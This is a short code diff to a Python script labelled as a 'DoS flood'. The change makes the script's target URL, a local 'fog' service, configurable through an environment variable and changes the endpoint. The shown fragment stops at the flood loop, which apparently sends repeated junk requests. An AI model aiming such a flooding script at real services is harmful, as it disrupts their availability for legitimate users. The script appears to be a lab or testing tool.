@@ -1,5 +1,5 @@
-﻿import requests, time
-FOG = 'http://fog:8000/ingest'
+﻿import requests, time, os
+FOG = os.environ.get("FOG_URL", "http://fog:8000/upload")
 payload = {'name':'dos','payload':'x'*100}
 count=0; print('Starting DoS flood (Ctrl-C to stop)')
 while True:
